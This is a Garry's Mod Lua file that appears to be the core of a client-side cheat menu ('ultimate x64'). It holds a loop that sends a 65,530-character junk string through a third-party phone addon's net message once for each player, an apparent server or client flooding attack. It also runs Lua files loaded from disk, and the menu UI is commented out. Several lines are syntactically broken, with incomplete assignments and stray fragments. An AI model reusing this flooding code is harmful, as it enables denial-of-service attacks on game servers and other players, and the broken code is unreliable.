// Core startup
local core = {}

// Environment setup 
function core.register( func )
    return setfenv( func )
end

function core.function( key, func )
    core[ key ] = core.register( func )
end


local zov = string.rep( "Z", 65530 )

local function sendtouser( str, ply )
    net.Start( "aphone_NewMessage", true )
        net.WriteUInt( ply:UserID(), 32 )
        net.WriteString( str )
    net.SendToServer()
end

local players = player.GetAll()
for i = 1, #players do
    sendtouser( zov, players[ i ] )
end


// Color class
core.color = { registry = {} }

function core.color.register( r, g, b, a )
    local color = core.color
    local index = #color.registry + 1

    color.registry[ index ] = {

    }
end

















// color class
core.colors 
 


// debug 
core.debug = { col = Color( 255, 255, 255 ) }

function core.debug.msg( ... )
    local col = core.debug.col
    local out = { ... }

    for i = 1, #out do
        local char = out[ i ]
         
        if string.sub( char, 1, 1 ) == "$" then
            col.r = string.sub( char, 2, 1 )
            col.g = 
            col.b = 

            continue 
        end
        
        col = color_white
        MsgC( col, char )
    end

    Msg("\n")
end
































// Code compilation 
function core.compile( str, key )
    local func = CompileString( str, "core :D", false )

    if isfunction( func ) then
        local succ, err = pcall( func )
        Msg( succ and ( "passed " .. key ) or err )

        return 
    end

    Msg( func )
end

local compileme = {
    ["a"] = "ultimate/a.lua",
    ["b"] = "ultimate/b.lua",
}

for key, val in pairs( compileme ) do
    core.compile( file.Read( val, "LuaMenu" ), key )
end






 





























/*


compileModule( "extensions/color" )
compileModule( "extensions/input" )

compileModule( "modules/config" )
compileModule( "modules/interface" )

local fonts = {
    ["outlined"] = {
        font = "Verdana", 
        extended = true,
        size = 13,
        weight = 500,
        antialias = false,
        outline = true,
    },
    ["normal"] = {
        font = "Verdana", 
        extended = true,
        size = 13,
        weight = 500,
        antialias = false,
    },
}
 
for key, val in _G.pairs( fonts ) do
    surface.CreateFont( key, val )
end

// User interface 
local show = false














// menu 
local frame = interface.push( 0, 0, 420, 560 )

local gradient = Material( "gui/gradient_down" )
local gradient_up = Material( "gui/gradient_up" )
local gradient_l = Material( "vgui/gradient-l" )

function frame.paint( self )
    local x, y, w, h = self.x, self.y, self.w, self.h 

    surface.SetDrawColor( color.unpack( config.theme.Background ) )
    surface.DrawRect( x, y, w, h )

    surface.SetDrawColor( color.unpack( config.theme.Header ) )
    surface.DrawRect( x, y, w, 24 )
    
    surface.SetDrawColor( color.unpack( config.theme.Outline ) )
    surface.DrawOutlinedRect( x, y, w, h )
    surface.DrawRect( x, y + 24, w, 1 )

    surface.SetFont( "normal" )
    surface.SetTextColor( color.unpack( config.theme.Title ) )

    surface.SetTextPos( x + 8, y + 6 )
    surface.DrawText( "сonfiguration" ) 
end

function frame.think( self )
    if uinput.inRect( self.x, self.y, self.w, self.h ) and input.IsMouseDown( MOUSE_LEFT ) and not interface.focus then
        self.x = self.x + ( uinput.cursorX - uinput.cursorXp )
        self.y = self.y + ( uinput.cursorY - uinput.cursorYp )
    end 
end




// Hooked events 
local hk = {}

local function mainrender()
    local map = game.GetMap() 
    local fps = math.floor( 1 / FrameTime() )

    local title = string.format( "ultimate x64 | %s | %s", map, fps )

    surface.SetFont( "normal" )
    surface.SetTextColor( color.unpack( config.theme.Title ) )

    local textWidth, textHeight = surface.GetTextSize( title )
    local x, y, w, h = 8, 8, textWidth + 16, 24

    surface.SetDrawColor( color.unpack( config.theme.Background ) )
    surface.DrawRect( x, y, w, h )

    surface.SetDrawColor( color.unpack( config.theme.Outline ) )
    surface.DrawOutlinedRect( x, y, w, h )

    surface.SetTextPos( x + 8, y + 5 )
    surface.DrawText( title ) 

    if IsInGame() then
        local gmode = engine.ActiveGamemode()
        local tickrate = math.floor( 1 / engine.TickInterval() )

        surface.SetTextColor( color.unpack( config.theme.Text ) )
    
        title = string.format( "%s - %i", gmode, tickrate )
    
        textWidth, textHeight = surface.GetTextSize( title )
        x, y, w, h = 8, 36, textWidth + 16, 24

        surface.SetDrawColor( color.unpack( config.theme.Background ) )
        surface.DrawRect( x, y, w, h )
    
        surface.SetDrawColor( color.unpack( config.theme.Outline ) )
        surface.DrawOutlinedRect( x, y, w, h )

        surface.SetTextPos( x + 8, y + 5 )
        surface.DrawText( title ) 
    end

    if not show then return end 

    interface.process()
end

function hk.DrawOverlay()

end 

function hk.PreViewRender()

end

function hk.Think()
    input.process()
end

for key, fn in pairs( hk ) do
    hook.Add( key, string.format( "hk.%s", key ), fn )
end

// Key listeners 
local keys = {
    [ KEY_DELETE ] = function()
        show = not show 
    end
}

for key, fn in pairs( keys ) do
    input.listen( key, fn )
end */